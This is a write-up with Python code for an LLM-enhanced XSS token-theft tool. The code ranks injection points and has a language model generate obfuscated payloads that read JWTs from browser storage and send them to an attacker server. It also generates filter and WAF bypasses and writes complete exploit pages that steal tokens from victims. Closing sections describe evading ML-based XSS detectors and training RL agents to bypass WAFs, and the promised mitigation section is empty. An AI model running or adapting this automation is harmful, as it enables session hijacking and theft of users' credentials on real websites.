This enhancement integrates directly with the `find_injection_points()` function. After the standard extraction functions gather raw data about forms, URL parameters, event handlers, and other injection vectors, the LLM analyzes the full context to prioritize which points are most likely exploitable. The LLM examines surrounding HTML, identifies sanitization patterns, predicts which fields handle user-visible content (more likely to reflect input), and assigns intelligent risk scores. This replaces guesswork with AI-driven prioritization.

**Integration Point:** Call `llm_prioritize_injection_points()` immediately after `find_injection_points()` returns in the `run_xss_simulation()` function.

```python
# =============================================================================
# LLM ENHANCEMENT 1: INTELLIGENT INJECTION POINT DISCOVERY
# Integrates with: find_injection_points() in run_xss_simulation()
# =============================================================================

import openai  # or anthropic
import json

def query_llm(prompt: str, model: str = "gpt-4") -> str:
    """
    Send prompt to LLM and get response.
    Supports OpenAI and Anthropic APIs.
    """
    try:
        # OpenAI API
        client = openai.OpenAI()
        response = client.chat.completions.create(
            model=model,
            messages=[
                {"role": "system", "content": "You are an expert security researcher specializing in XSS vulnerabilities. Analyze web application contexts and identify exploitable injection points."},
                {"role": "user", "content": prompt}
            ],
            temperature=0.3,
            max_tokens=2000
        )
        return response.choices[0].message.content
    except Exception as e:
        logger.error(f"LLM query failed: {e}")
        return None


def llm_prioritize_injection_points(injection_points: dict, 
                                     html_content: str,
                                     target_url: str) -> dict:
    """
    Use LLM to intelligently prioritize and enhance injection point data.
    Analyzes context to predict exploitability and assign risk scores.
    
    Args:
        injection_points: Raw output from find_injection_points()
        html_content: Full HTML of the target page
        target_url: The URL being tested
        
    Returns:
        Enhanced injection_points dict with LLM-added metadata
    """
    
    # Build context summary for LLM (truncate to avoid token limits)
    context_summary = {
        'url': target_url,
        'total_forms': len(injection_points.get('forms', [])),
        'total_url_params': len(injection_points.get('url_parameters', [])),
        'total_event_handlers': len(injection_points.get('event_handlers', [])),
        'total_templates': len(injection_points.get('templates', [])),
        'total_postmessage': len(injection_points.get('postmessage', [])),
        'forms_detail': injection_points.get('forms', [])[:5],  # Top 5
        'event_handlers_detail': injection_points.get('event_handlers', [])[:5],
        'html_snippet': html_content[:3000]  # First 3000 chars
    }
    
    prompt = f"""Analyze these XSS injection points and provide intelligent prioritization.

TARGET: {target_url}

DISCOVERED INJECTION POINTS:
{json.dumps(context_summary, indent=2)}

HTML CONTEXT (first 3000 chars):
{context_summary['html_snippet']}

ANALYSIS TASKS:
1. For each form, predict which input fields are most likely to reflect user input (search boxes, comment fields, username displays)
2. Identify any sanitization patterns visible in the HTML (e.g., escaped entities, filtered characters)
3. Analyze event handlers for dangerous sinks (innerHTML, eval, document.write)
4. Identify if the page uses a frontend framework (React, Vue, Angular) and note template injection risks
5. Check for security indicators (CSP meta tags, nonce attributes)

Respond in JSON format:
{{
    "priority_ranking": [
        {{
            "category": "form|url_param|event_handler|template|postmessage|...",
            "identifier": "form action or handler name",
            "risk_score": 1-10,
            "reasoning": "why this is exploitable",
            "recommended_payload_type": "reflected|dom|stored|template",
            "bypass_suggestions": ["suggestion1", "suggestion2"]
        }}
    ],
    "detected_sanitization": ["list of detected filters/encoding"],
    "framework_detected": "none|react|vue|angular|jquery",
    "security_controls": ["csp", "nonce", "other"],
    "attack_chain_opportunities": ["chain description if multiple points can be combined"]
}}
"""
    
    # Query LLM
    llm_response = query_llm(prompt)
    
    if not llm_response:
        logger.warning("LLM analysis failed, using default prioritization")
        return injection_points
    
    try:
        # Parse LLM response
        analysis = json.loads(llm_response)
        
        # Enhance injection points with LLM insights
        injection_points['llm_analysis'] = {
            'priority_ranking': analysis.get('priority_ranking', []),
            'detected_sanitization': analysis.get('detected_sanitization', []),
            'framework_detected': analysis.get('framework_detected', 'unknown'),
            'security_controls': analysis.get('security_controls', []),
            'attack_chains': analysis.get('attack_chain_opportunities', [])
        }
        
        # Sort categories by LLM risk score
        priority_map = {
            p['identifier']: p['risk_score'] 
            for p in analysis.get('priority_ranking', [])
        }
        
        # Add risk scores to individual points
        for category, points in injection_points.items():
            if category in ['summary', 'llm_analysis']:
                continue
            if isinstance(points, list):
                for point in points:
                    identifier = point.get('action', point.get('name', point.get('handler', '')))
                    if identifier in priority_map:
                        point['llm_risk_score'] = priority_map[identifier]
                        point['llm_analyzed'] = True
        
        logger.info(f"LLM Analysis Complete:")
        logger.info(f"  Framework detected: {analysis.get('framework_detected', 'none')}")
        logger.info(f"  Security controls: {analysis.get('security_controls', [])}")
        logger.info(f"  High-priority targets: {len([p for p in analysis.get('priority_ranking', []) if p.get('risk_score', 0) >= 7])}")
        
    except json.JSONDecodeError as e:
        logger.error(f"Failed to parse LLM response as JSON: {e}")
        injection_points['llm_analysis'] = {'error': 'parse_failed', 'raw': llm_response[:500]}
    
    return injection_points


def get_llm_bypass_suggestions(category: str, 
                                sanitization_detected: list,
                                failed_payload: str) -> list:
    """
    When a payload fails, ask LLM for bypass suggestions.
    
    Args:
        category: Injection category (form, url_param, etc.)
        sanitization_detected: List of detected filters
        failed_payload: The payload that was blocked
        
    Returns:
        List of suggested bypass payloads
    """
    prompt = f"""A XSS payload was blocked. Generate bypass alternatives.

INJECTION CATEGORY: {category}
DETECTED SANITIZATION: {sanitization_detected}
BLOCKED PAYLOAD: {failed_payload}

Generate 5 alternative payloads that:
1. Avoid the detected filters
2. Use encoding/obfuscation techniques
3. Maintain XSS execution capability
4. Target the specific injection context

Respond as JSON array of strings:
["payload1", "payload2", "payload3", "payload4", "payload5"]
"""
    
    response = query_llm(prompt)
    
    try:
        return json.loads(response)
    except:
        return []


# =============================================================================
# INTEGRATION EXAMPLE: Modified run_xss_simulation()
# =============================================================================

def run_xss_simulation_with_llm(target_url: str, attacker_server: str):
    """
    Enhanced version of run_xss_simulation with LLM integration.
    Shows where LLM functions integrate into the workflow.
    """
    logger.info(f"=" * 60)
    logger.info(f"LLM-ENHANCED XSS TOKEN THEFT SIMULATION")
    logger.info(f"=" * 60)
    
    session = requests.Session()
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    })
    
    # Step 1: Standard injection point discovery
    logger.info(f"\n[STEP 1] Discovering injection points (standard)...")
    injection_points = find_injection_points(target_url, session)
    
    # Step 2: LLM-ENHANCED PRIORITIZATION (NEW!)
    logger.info(f"\n[STEP 2] LLM Analysis & Prioritization...")
    try:
        response = session.get(target_url, timeout=10)
        html_content = response.text
    except:
        html_content = ""
    
    # ★ THIS IS WHERE LLM ENHANCEMENT 1 INTEGRATES ★
    injection_points = llm_prioritize_injection_points(
        injection_points, 
        html_content, 
        target_url
    )
    
    # Log LLM insights
    if 'llm_analysis' in injection_points:
        analysis = injection_points['llm_analysis']
        if analysis.get('attack_chains'):
            logger.warning(f"[!] LLM identified attack chains: {analysis['attack_chains']}")
    
    # Step 3: Generate payloads (can also be LLM-enhanced - see Enhancement 2)
    payloads = generate_xss_payloads(attacker_server)
    
    # Step 4: Test with LLM-guided prioritization
    # Sort injection points by LLM risk score (highest first)
    for category, points in injection_points.items():
        if category in ['summary', 'llm_analysis']:
            continue
        if isinstance(points, list):
            points.sort(key=lambda x: x.get('llm_risk_score', 5), reverse=True)
    
    # Continue with standard testing flow...
    logger.info(f"\n[STEP 3-4] Testing prioritized injection points...")
    # ... rest of testing logic from run_xss_simulation() ...
```
**LLM Enhancement 2: Context-Aware Payload Generation**

This enhancement integrates with the `generate_xss_payloads()` function and the category-specific test functions. Instead of using static payload lists, the LLM analyzes the exact HTML/JavaScript context where the payload will be injected and generates payloads specifically designed to escape that context. For example, if the injection lands inside a JavaScript string within an `onclick` attribute, the LLM generates payloads that close the string, close the attribute, and then execute JavaScript—all in one crafted payload.

**Integration Points:**
1. Replace `generate_xss_payloads()` with `llm_generate_context_payloads()`
2. Call `analyze_injection_context()` before each test to understand the exact DOM position
3. Use after failed tests to generate bypass payloads based on detected sanitization

```python
# =============================================================================
# LLM ENHANCEMENT 2: CONTEXT-AWARE PAYLOAD GENERATION
# Integrates with: generate_xss_payloads() and test_*_xss() functions
# =============================================================================

def analyze_injection_context(html_content: str, 
                               injection_point: dict,
                               test_marker: str = "TESTXSS123") -> dict:
    """
    Send a test marker to identify exactly where input appears in the response.
    Returns detailed context analysis for LLM payload generation.
    
    Args:
        html_content: Response HTML containing the reflected test marker
        injection_point: The injection point being tested
        test_marker: The marker string that was injected
        
    Returns:
        Context analysis dict with position, surrounding code, and escape sequence needed
    """
    import re
    
    context = {
        'marker_found': False,
        'position': None,
        'context_type': 'unknown',
        'surrounding_code': '',
        'escape_sequence_needed': '',
        'characters_encoded': [],
        'characters_allowed': []
    }
    
    if test_marker not in html_content:
        return context
    
    context['marker_found'] = True
    
    # Find position of marker
    marker_pos = html_content.find(test_marker)
    
    # Extract surrounding context (200 chars before and after)
    start = max(0, marker_pos - 200)
    end = min(len(html_content), marker_pos + len(test_marker) + 200)
    context['surrounding_code'] = html_content[start:end]
    
    # Analyze context type
    before_marker = html_content[start:marker_pos]
    
    # Check if inside HTML attribute
    if re.search(r'[\w-]+\s*=\s*["\'][^"\']*$', before_marker):
        quote_char = '"' if '"' in before_marker[-50:] else "'"
        context['context_type'] = f'html_attribute_{quote_char}'
        context['escape_sequence_needed'] = f'{quote_char}>'
        
        # Check which attribute
        attr_match = re.search(r'(on\w+|href|src|action|data-\w+)\s*=\s*["\'][^"\']*$', before_marker, re.I)
        if attr_match:
            context['attribute_name'] = attr_match.group(1).lower()
            if context['attribute_name'].startswith('on'):
                context['context_type'] = 'event_handler_attribute'
                context['escape_sequence_needed'] = f'{quote_char} '
    
    # Check if inside script tag
    elif re.search(r'<script[^>]*>[^<]*$', before_marker, re.I):
        context['context_type'] = 'script_block'
        # Check if inside JS string
        if re.search(r'["\'][^"\']*$', before_marker):
            js_quote = '"' if '"' in before_marker[-30:] else "'"
            context['context_type'] = f'javascript_string_{js_quote}'
            context['escape_sequence_needed'] = f'{js_quote};'
        else:
            context['escape_sequence_needed'] = ''
    
    # Check if inside HTML comment
    elif '<!--' in before_marker and '-->' not in before_marker[before_marker.rfind('<!--'):]:
        context['context_type'] = 'html_comment'
        context['escape_sequence_needed'] = '-->'
    
    # Check if inside style tag
    elif re.search(r'<style[^>]*>[^<]*$', before_marker, re.I):
        context['context_type'] = 'style_block'
        context['escape_sequence_needed'] = '</style>'
    
    # Check if inside textarea/title/other special tags
    elif re.search(r'<(textarea|title|noscript|iframe)[^>]*>[^<]*$', before_marker, re.I):
        tag = re.search(r'<(textarea|title|noscript|iframe)', before_marker, re.I).group(1)
        context['context_type'] = f'{tag.lower()}_content'
        context['escape_sequence_needed'] = f'</{tag}>'
    
    else:
        context['context_type'] = 'html_body'
        context['escape_sequence_needed'] = ''
    
    # Test which characters are encoded by checking response
    test_chars = ['<', '>', '"', "'", '/', '\\', '(', ')', '=', ' ', '\n', '\t']
    # This would need to be done in the actual test function by sending test payloads
    
    return context


def llm_generate_context_payloads(context: dict,
                                   attacker_server: str,
                                   token_location: str = "localStorage.jwt") -> list:
    """
    Use LLM to generate payloads specifically designed for the injection context.
    
    Args:
        context: Output from analyze_injection_context()
        attacker_server: URL for token exfiltration
        token_location: Where targets store JWT tokens
        
    Returns:
        List of context-optimized XSS payloads
    """
    
    prompt = f"""Generate XSS payloads for this specific injection context.

INJECTION CONTEXT:
- Context Type: {context.get('context_type', 'unknown')}
- Escape Sequence Needed: {context.get('escape_sequence_needed', 'none')}
- Attribute Name (if applicable): {context.get('attribute_name', 'N/A')}
- Surrounding Code: 
{context.get('surrounding_code', 'N/A')}

PAYLOAD REQUIREMENTS:
1. Steal token from: {token_location}
2. Exfiltrate to: {attacker_server}
3. Must work in the detected context
4. Include multiple obfuscation variants

Generate 10 payloads optimized for this context. Each payload must:
- First escape the current context using the escape sequence
- Then execute JavaScript to steal the token
- Use different obfuscation techniques

CONTEXT-SPECIFIC RULES:
- If html_attribute: close the attribute, then add event handler or new tag
- If javascript_string: close the string, add semicolon, then your code
- If event_handler_attribute: just close the JS context appropriately
- If html_body: standard script tags or event handlers work
- If html_comment: close comment with --> first
- If textarea_content: close textarea tag first

OBFUSCATION TECHNIQUES TO USE:
- Unicode escapes (\\u0061 for 'a')
- HTML entities (&#x3C; for '<')
- Template literals (`${{}}`)
- Constructor tricks ([][[]][+[]+!![]].constructor())
- Fromcharcode (String.fromCharCode(60))
- Base64 with atob()
- SVG/IMG/IFRAME alternative vectors

Respond as JSON:
{{
    "payloads": [
        {{
            "payload": "the actual payload string",
            "technique": "obfuscation technique used",
            "explanation": "why this works in this context"
        }}
    ],
    "recommended_first": 0,
    "context_escape_verified": true
}}
"""
    
    response = query_llm(prompt)
    
    try:
        result = json.loads(response)
        payloads = []
        
        for p in result.get('payloads', []):
            payloads.append({
                'payload': p.get('payload', ''),
                'technique': p.get('technique', 'unknown'),
                'explanation': p.get('explanation', ''),
                'context_optimized': True
            })
        
        logger.info(f"LLM generated {len(payloads)} context-aware payloads for {context.get('context_type')}")
        return payloads
        
    except json.JSONDecodeError:
        logger.error("Failed to parse LLM payload response")
        return []


def llm_generate_bypass_payloads(original_payload: str,
                                  failed_reason: str,
                                  detected_filters: list,
                                  context: dict) -> list:
    """
    After a payload fails, ask LLM to generate bypass variants.
    
    Args:
        original_payload: The payload that was blocked
        failed_reason: Why it failed (filtered, encoded, blocked)
        detected_filters: List of detected sanitization patterns
        context: The injection context
        
    Returns:
        List of bypass payload attempts
    """
    
    prompt = f"""A XSS payload was blocked. Generate bypass variants.

ORIGINAL PAYLOAD: {original_payload}
FAILURE REASON: {failed_reason}
DETECTED FILTERS: {detected_filters}
INJECTION CONTEXT: {context.get('context_type', 'unknown')}

Analyze what was blocked and generate 5 bypass attempts that:
1. Avoid the detected filters completely
2. Use alternative encoding that bypasses sanitization
3. Achieve the same XSS effect
4. Are increasingly creative/obscure

BYPASS TECHNIQUES TO CONSIDER:
- If < is filtered: use \\u003c, &#60;, &#x3C;, or data: URLs
- If script is filtered: use svg/onload, img/onerror, body/onload, input/onfocus
- If parentheses filtered: use backticks with tagged templates
- If quotes filtered: use template literals or /regex/.source
- If = is filtered: use HTML entities in attributes
- Double encoding if server decodes twice
- Null bytes or other parser confusion characters
- Unicode normalization exploits (ﬀ for ff)

Respond as JSON array:
[
    {{"payload": "...", "bypass_technique": "...", "confidence": "high|medium|low"}}
]
"""
    
    response = query_llm(prompt)
    
    try:
        return json.loads(response)
    except:
        return []


# =============================================================================
# INTEGRATION EXAMPLE: Enhanced test function with context analysis
# =============================================================================

def test_form_xss_with_llm(target_url: str, form_data: dict, 
                            session: requests.Session,
                            attacker_server: str) -> dict:
    """
    Enhanced form XSS testing with LLM context-aware payload generation.
    Shows how Enhancement 2 integrates with category-specific tests.
    """
    result = {
        'category': 'form',
        'url': form_data.get('action', target_url),
        'success': False,
        'payloads_tested': 0,
        'llm_enhanced': True
    }
    
    # Step 1: Send test marker to analyze context
    test_marker = f"XSSTEST{random.randint(10000,99999)}"
    post_data = {}
    for input_field in form_data.get('inputs', []):
        if input_field.get('injectable', True):
            post_data[input_field['name']] = test_marker
        else:
            post_data[input_field['name']] = input_field.get('value', '')
    
    try:
        if form_data.get('method', 'GET').upper() == 'POST':
            response = session.post(form_data.get('action', target_url), 
                                   data=post_data, timeout=15)
        else:
            response = session.get(form_data.get('action', target_url), 
                                  params=post_data, timeout=15)
        
        # Step 2: Analyze where marker appears (★ CONTEXT ANALYSIS ★)
        context = analyze_injection_context(response.text, form_data, test_marker)
        
        if not context['marker_found']:
            logger.info(f"Input not reflected - stored XSS or no reflection")
            result['reflection_type'] = 'none_or_stored'
            return result
        
        logger.info(f"Context detected: {context['context_type']}")
        logger.info(f"Escape sequence: {context['escape_sequence_needed']}")
        
        # Step 3: Generate context-aware payloads (★ LLM PAYLOAD GENERATION ★)
        payloads = llm_generate_context_payloads(
            context=context,
            attacker_server=attacker_server,
            token_location="localStorage.token || sessionStorage.token"
        )
        
        # Step 4: Test each payload
        for payload_data in payloads:
            payload = payload_data['payload']
            result['payloads_tested'] += 1
            
            # Inject payload
            post_data_attack = {}
            for input_field in form_data.get('inputs', []):
                if input_field.get('injectable', True):
                    post_data_attack[input_field['name']] = payload
                else:
                    post_data_attack[input_field['name']] = input_field.get('value', '')
            
            if form_data.get('method', 'GET').upper() == 'POST':
                attack_response = session.post(form_data.get('action', target_url),
                                              data=post_data_attack, timeout=15)
            else:
                attack_response = session.get(form_data.get('action', target_url),
                                             params=post_data_attack, timeout=15)
            
            # Check for successful injection
            if payload in attack_response.text:
                result['success'] = True
                result['working_payload'] = payload
                result['technique'] = payload_data.get('technique')
                result['explanation'] = payload_data.get('explanation')
                logger.warning(f"✓ XSS SUCCESS with {payload_data.get('technique')}")
                break
            
            # If blocked, try LLM bypass (★ ADAPTIVE BYPASS ★)
            else:
                detected_filters = []
                if '<' not in attack_response.text and '<' in payload:
                    detected_filters.append('angle_brackets')
                if 'script' not in attack_response.text.lower() and 'script' in payload.lower():
                    detected_filters.append('script_keyword')
                
                if detected_filters:
                    bypass_payloads = llm_generate_bypass_payloads(
                        original_payload=payload,
                        failed_reason='sanitized',
                        detected_filters=detected_filters,
                        context=context
                    )
                    
                    # Try bypass payloads
                    for bypass in bypass_payloads[:3]:  # Try top 3 bypasses
                        bypass_payload = bypass.get('payload', '')
                        post_data_attack[list(post_data_attack.keys())[0]] = bypass_payload
                        
                        bypass_response = session.post(
                            form_data.get('action', target_url),
                            data=post_data_attack, timeout=15
                        ) if form_data.get('method', 'GET').upper() == 'POST' else \
                        session.get(
                            form_data.get('action', target_url),
                            params=post_data_attack, timeout=15
                        )
                        
                        if bypass_payload in bypass_response.text:
                            result['success'] = True
                            result['working_payload'] = bypass_payload
                            result['technique'] = f"bypass: {bypass.get('bypass_technique')}"
                            result['original_blocked'] = payload
                            logger.warning(f"✓ XSS SUCCESS via BYPASS: {bypass.get('bypass_technique')}")
                            break
        
    except Exception as e:
        logger.error(f"Test failed: {e}")
        result['error'] = str(e)
    
    return result
```

**LLM Enhancement 3: Chain Attack Planning**

This enhancement analyzes findings across all 11 injection categories to identify how multiple vulnerabilities can be chained together for maximum impact. A single low-severity XSS might be insufficient for token theft, but combined with a missing origin check on postMessage or insecure WebSocket handling, the attack becomes highly exploitable. The LLM synthesizes findings into actionable attack chains.

**Integration Point:** Call `llm_synthesize_attack_chains()` after all category tests complete in `run_xss_simulation()`.

```python
# =============================================================================
# LLM ENHANCEMENT 3: CHAIN ATTACK PLANNING
# Integrates with: Final phase of run_xss_simulation() after all tests
# =============================================================================

def llm_synthesize_attack_chains(all_results: dict, 
                                  target_url: str,
                                  token_locations: list) -> dict:
    """
    Analyze all scan results to identify multi-step attack chains.
    Combines findings across categories for maximum exploitation impact.
    
    Args:
        all_results: Complete results from run_xss_simulation()
        target_url: The target URL
        token_locations: Where tokens are stored (localStorage, cookies, etc.)
        
    Returns:
        Attack chain analysis with step-by-step exploitation paths
    """
    
    # Build summary of all findings for LLM
    findings_summary = {
        'target': target_url,
        'token_locations': token_locations,
        'vulnerabilities': []
    }
    
    for category, results in all_results.items():
        if category == 'summary':
            continue
        if isinstance(results, list):
            for r in results:
                if r.get('success') or r.get('exploitable') or r.get('risk') in ['high', 'critical']:
                    findings_summary['vulnerabilities'].append({
                        'category': category,
                        'type': r.get('category', category),
                        'confidence': r.get('overall_confidence', 'unknown'),
                        'details': {
                            'url': r.get('url', r.get('endpoint', '')),
                            'payload': r.get('working_payload', r.get('payload', ''))[:100] if r.get('working_payload') or r.get('payload') else None,
                            'requires_browser': r.get('requires_browser_test', False),
                            'has_exploit': bool(r.get('exploit_html') or r.get('exploit_code') or r.get('test_url'))
                        }
                    })
    
    if not findings_summary['vulnerabilities']:
        return {'chains': [], 'message': 'No exploitable vulnerabilities found for chaining'}
    
    prompt = f"""Analyze these XSS scan results and identify attack chains.

TARGET: {target_url}
TOKEN STORAGE: {token_locations}

DISCOVERED VULNERABILITIES:
{json.dumps(findings_summary['vulnerabilities'], indent=2)}

ANALYSIS TASKS:
1. Identify how vulnerabilities can be COMBINED for greater impact
2. For each chain, provide step-by-step exploitation instructions
3. Prioritize chains that lead to JWT/token theft
4. Consider bypass strategies if CSP or other controls are present

CHAIN TYPES TO CONSIDER:
- Reflected XSS + postMessage (bypass CSP via iframe)
- Form XSS + WebSocket (escalate to real-time session hijacking)
- DOM XSS via fragment + storage XSS (persistent compromise)
- Template injection + event handler (framework-specific RCE)
- File upload XSS + API endpoint (stored XSS via uploaded file)

Respond in JSON:
{{
    "attack_chains": [
        {{
            "name": "Chain name",
            "severity": "critical|high|medium",
            "steps": [
                {{
                    "step": 1,
                    "action": "What to do",
                    "vulnerability_used": "category name",
                    "payload_or_technique": "specific payload",
                    "expected_result": "what happens"
                }}
            ],
            "final_impact": "What attacker achieves",
            "success_probability": "high|medium|low",
            "csp_bypass": true|false,
            "prerequisites": ["list of requirements"]
        }}
    ],
    "highest_priority_chain": 0,
    "recommended_order": [0, 1, 2],
    "notes": "Additional observations"
}}
"""
    
    response = query_llm(prompt)
    
    try:
        analysis = json.loads(response)
        
        # Log findings
        chains = analysis.get('attack_chains', [])
        logger.info(f"\n" + "=" * 60)
        logger.info("LLM ATTACK CHAIN ANALYSIS")
        logger.info("=" * 60)
        
        for i, chain in enumerate(chains):
            severity = chain.get('severity', 'unknown')
            severity_icon = '🔴' if severity == 'critical' else '🟠' if severity == 'high' else '🟡'
            logger.info(f"\n{severity_icon} Chain {i+1}: {chain.get('name')}")
            logger.info(f"   Severity: {severity}")
            logger.info(f"   Steps: {len(chain.get('steps', []))}")
            logger.info(f"   Impact: {chain.get('final_impact', 'unknown')}")
            
            if chain.get('csp_bypass'):
                logger.warning(f"   ⚠ Includes CSP bypass technique!")
        
        return analysis
        
    except json.JSONDecodeError:
        logger.error("Failed to parse LLM chain analysis")
        return {'chains': [], 'error': 'parse_failed'}


def generate_attack_chain_exploit(chain: dict, 
                                   attacker_server: str) -> str:
    """
    Generate a complete exploit HTML/JS file for an attack chain.
    """
    
    prompt = f"""Generate a complete exploit for this attack chain.

ATTACK CHAIN:
{json.dumps(chain, indent=2)}

ATTACKER SERVER: {attacker_server}

Generate a self-contained HTML file that:
1. Executes all steps in the chain automatically
2. Handles timing between steps
3. Exfiltrates stolen tokens to the attacker server
4. Includes error handling and logging
5. Works when victim visits the attacker page

Respond with ONLY the HTML/JavaScript code, no explanation.
Start with <!DOCTYPE html>
"""
    
    return query_llm(prompt)
```

**LLM Enhancement 4: Natural Language Report Generation**

This enhancement transforms raw scan results into professional penetration testing reports. The LLM generates executive summaries for non-technical stakeholders, detailed technical findings for developers, and remediation guidance prioritized by risk. Reports can be customized for different audiences.

**Integration Point:** Call `llm_generate_report()` at the end of the scan or when exporting results.

```python
# =============================================================================
# LLM ENHANCEMENT 4: NATURAL LANGUAGE REPORT GENERATION
# Integrates with: Export/reporting phase after scan completion
# =============================================================================

def llm_generate_report(scan_results: dict,
                         attack_chains: dict,
                         target_url: str,
                         report_type: str = "full") -> dict:
    """
    Generate a professional penetration test report from scan results.
    
    Args:
        scan_results: Complete results from run_xss_simulation()
        attack_chains: Output from llm_synthesize_attack_chains()
        target_url: The target URL
        report_type: "executive", "technical", or "full"
        
    Returns:
        Report dict with formatted sections
    """
    
    # Calculate statistics
    total_tests = scan_results.get('summary', {}).get('total_tests', 0)
    total_vulnerable = scan_results.get('summary', {}).get('total_vulnerable', 0)
    high_risk = scan_results.get('summary', {}).get('high_risk_findings', 0)
    
    categories_with_findings = []
    for category, results in scan_results.items():
        if category == 'summary':
            continue
        if isinstance(results, list) and any(r.get('success') for r in results):
            categories_with_findings.append(category)
    
    prompt = f"""Generate a professional XSS penetration test report.

TARGET: {target_url}
REPORT TYPE: {report_type}

SCAN STATISTICS:
- Total tests performed: {total_tests}
- Vulnerabilities confirmed: {total_vulnerable}
- High-risk findings: {high_risk}
- Categories with findings: {categories_with_findings}

VULNERABILITY DETAILS:
{json.dumps({k: v for k, v in scan_results.items() if k != 'summary'}, indent=2, default=str)[:5000]}

ATTACK CHAINS IDENTIFIED:
{json.dumps(attack_chains.get('attack_chains', [])[:3], indent=2)}

GENERATE A REPORT WITH THESE SECTIONS:

1. EXECUTIVE SUMMARY (3-4 paragraphs)
   - Overall risk rating (Critical/High/Medium/Low)
   - Business impact in non-technical terms
   - Key recommendations summary
   
2. TECHNICAL FINDINGS (per vulnerability)
   - Description of the vulnerability
   - Affected endpoint/parameter
   - Proof of concept payload
   - CVSS-style severity rating
   
3. ATTACK SCENARIOS
   - How attackers could exploit these findings
   - Potential data at risk (JWT tokens, session data)
   - Attack chain descriptions
   
4. REMEDIATION GUIDANCE (prioritized)
   - Immediate actions (0-24 hours)
   - Short-term fixes (1-7 days)
   - Long-term improvements (1-3 months)
   
5. APPENDIX
   - Testing methodology
   - Tools used
   - Scope limitations

Respond in JSON format:
{{
    "report_title": "XSS Vulnerability Assessment Report",
    "target": "{target_url}",
    "date": "current date",
    "overall_risk_rating": "Critical|High|Medium|Low",
    "executive_summary": "...",
    "findings": [
        {{
            "id": "XSS-001",
            "title": "...",
            "severity": "...",
            "cvss_score": 0.0,
            "description": "...",
            "affected_endpoint": "...",
            "proof_of_concept": "...",
            "impact": "...",
            "remediation": "..."
        }}
    ],
    "attack_scenarios": ["..."],
    "remediation_roadmap": {{
        "immediate": ["..."],
        "short_term": ["..."],
        "long_term": ["..."]
    }},
    "methodology": "...",
    "limitations": ["..."]
}}
"""
    
    response = query_llm(prompt, model="gpt-4")  # Use best model for reports
    
    try:
        report = json.loads(response)
        logger.info(f"Generated {report_type} report: {report.get('report_title')}")
        logger.info(f"Overall Risk Rating: {report.get('overall_risk_rating')}")
        return report
        
    except json.JSONDecodeError:
        logger.error("Failed to parse report JSON")
        return {'error': 'parse_failed', 'raw_response': response[:1000]}


def export_report_markdown(report: dict) -> str:
    """
    Convert JSON report to formatted Markdown.
    """
    # Build header section
    md = "# " + report.get('report_title', 'XSS Assessment Report') + "\n\n"
    md += "**Target:** " + str(report.get('target', 'N/A')) + "  \n"
    md += "**Date:** " + str(report.get('date', 'N/A')) + "  \n"
    md += "**Overall Risk Rating:** " + str(report.get('overall_risk_rating', 'N/A')) + "\n\n"
    md += "---\n\n"
    md += "## Executive Summary\n\n"
    md += report.get('executive_summary', 'No summary available.') + "\n\n"
    md += "---\n\n"
    md += "## Findings\n\n"
    
    # Add each finding
    for finding in report.get('findings', []):
        severity = finding.get('severity', 'Unknown')
        if severity == 'Critical':
            severity_badge = '🔴'
        elif severity == 'High':
            severity_badge = '🟠'
        elif severity == 'Medium':
            severity_badge = '🟡'
        else:
            severity_badge = '🟢'
        
        finding_id = finding.get('id', 'N/A')
        finding_title = finding.get('title', 'N/A')
        
        md += "### " + severity_badge + " " + finding_id + ": " + finding_title + "\n\n"
        md += "| Attribute | Value |\n"
        md += "|-----------|-------|\n"
        md += "| Severity | " + str(finding.get('severity', 'N/A')) + " |\n"
        md += "| CVSS Score | " + str(finding.get('cvss_score', 'N/A')) + " |\n"
        md += "| Endpoint | `" + str(finding.get('affected_endpoint', 'N/A')) + "` |\n\n"
        md += "**Description:** " + str(finding.get('description', 'N/A')) + "\n\n"
        md += "**Impact:** " + str(finding.get('impact', 'N/A')) + "\n\n"
        md += "**Proof of Concept:**\n"
        md += "```javascript\n"
        md += str(finding.get('proof_of_concept', 'N/A')) + "\n"
        md += "```\n\n"
        md += "**Remediation:** " + str(finding.get('remediation', 'N/A')) + "\n\n"
        md += "---\n\n"
    
    # Remediation roadmap
    md += "## Remediation Roadmap\n\n"
    md += "### 🚨 Immediate (0-24 hours)\n"
    for item in report.get('remediation_roadmap', {}).get('immediate', []):
        md += "- " + str(item) + "\n"
    
    md += "\n### ⚠️ Short-term (1-7 days)\n"
    for item in report.get('remediation_roadmap', {}).get('short_term', []):
        md += "- " + str(item) + "\n"
    
    md += "\n### 📋 Long-term (1-3 months)\n"
    for item in report.get('remediation_roadmap', {}).get('long_term', []):
        md += "- " + str(item) + "\n"
    
    # Methodology and limitations
    md += "\n---\n\n"
    md += "## Methodology\n\n"
    md += str(report.get('methodology', 'N/A')) + "\n\n"
    md += "## Limitations\n\n"
    for limitation in report.get('limitations', []):
        md += "- " + str(limitation) + "\n"
    
    return md


def export_report_html(report: dict) -> str:
    """
    Convert JSON report to styled HTML for sharing.
    """
    prompt = f"""Convert this security report to a professional HTML document.

REPORT JSON:
{json.dumps(report, indent=2)}

Create a styled HTML document with:
- Professional dark theme
- Clear section headers
- Severity color coding (red/orange/yellow/green)
- Syntax highlighting for code
- Responsive tables
- Print-friendly CSS

Return ONLY the HTML, starting with <!DOCTYPE html>
"""
    
    return query_llm(prompt)
```

**Machine Learning-Driven XSS Detection Evasion** 

Uses adversarial techniques to probe and evade ML-based XSS detection systems. Security vendors increasingly use ML classifiers to detect malicious JavaScript, but these can be fooled through adversarial inputs. Attackers can train surrogate models to mimic target detection systems and use gradient-based methods to find perturbations that cause misclassification while maintaining malicious functionality.


**Reinforcement Learning for WAF Bypass Optimization**

Reinforcement learning (RL) agents can be trained to automatically discover WAF bypass techniques by treating the penetration testing process as a sequential decision-making problem with rewards for successful bypasses. The RL agent learns through trial and error which payload modifications, encoding techniques, and delivery methods successfully bypass target security controls. Each bypass attempt provides feedback that the agent uses to refine its strategy, gradually building a policy that maximizes the probability of successful XSS execution. The agent can learn to chain multiple evasion techniques—such as double URL encoding, Unicode normalization, and HTML entity encoding—in combinations that have never been seen before. By training across multiple WAF implementations, the agent can develop generalizable bypass strategies that work against various vendor-specific rules. The state space includes the current payload structure, observed WAF responses, and the target application's behavior, allowing context-aware decision making. This approach automates what would otherwise require deep security expertise and extensive manual testing time. Over time, the RL agent becomes increasingly effective at finding bypass paths that human testers might overlook.

#### Mitigation Application

Implementing multiple layers of defense prevents this attack from succeeding:

**Step-by-step mitigation:**

